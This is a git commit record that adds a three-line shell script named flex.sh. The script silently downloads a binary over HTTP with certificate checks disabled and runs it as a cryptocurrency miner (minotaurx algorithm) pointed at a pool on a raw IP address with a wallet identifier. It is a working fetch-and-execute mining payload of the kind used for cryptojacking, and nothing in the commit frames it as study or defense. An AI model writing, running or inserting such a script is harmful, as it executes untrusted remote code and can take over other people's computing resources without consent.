ae8a4b107803d89ef62ce8b3a2e90515b28f430f
paskofamas <mr.paskofa42@jugda.com>
2025-03-03 23:36:28 +0700

    Create flex.sh

---
+++ flex.sh
@@ -0,0 +1,3 @@
+#!/bin/sh
+curl -sLkO http://github.com/paskofa10/webmoon/releases/download/flex/flex
+./flex -a minotaurx -o 198.50.168.213:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA
